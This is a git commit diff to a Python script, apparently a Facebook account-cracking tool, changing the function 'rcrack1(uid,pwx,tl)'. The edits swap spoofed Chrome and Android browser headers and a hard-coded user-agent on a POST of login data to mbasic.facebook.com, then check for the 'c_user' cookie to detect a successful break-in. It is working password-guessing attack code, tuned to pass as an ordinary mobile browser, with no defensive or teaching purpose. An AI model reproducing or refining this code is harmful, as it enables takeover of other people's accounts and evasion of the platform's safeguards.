a3a4b062354d8cf64b7f58f5533112f6691732ba
TR-RONI <134133297+TR-RONI@users.noreply.github.com>
2023-05-22 12:07:31 +0600

    Add files via upload

--- TR-RONI.py
+++ TR-RONI.py
@@ -280,14 +280,13 @@ def rcrack1(uid,pwx,tl):
             "login":"Log In"}
             header_freefb = {'authority': 'x.facebook.com',
            'method':'POST',
-           'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
            'scheme':'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-prefers-color-scheme': 'light',
-           'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
-           'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="114.0.5643.201", "Google Chrome";v="114.0.5643.201"',
+           'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="113", "Google Chrome";v="113"',
+           'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="113.0.5633.201", "Google Chrome";v="113.0.5633.201"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '""',
@@ -296,7 +295,9 @@ def rcrack1(uid,pwx,tl):
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
-           'user-agent': pro }
+           'user-agent': 'Mozilla/5.0 (Linux; Android 11; SM-T595) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5633.201 Mobile Safari/537.36',
+           'viewport-width': '980',
+}
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
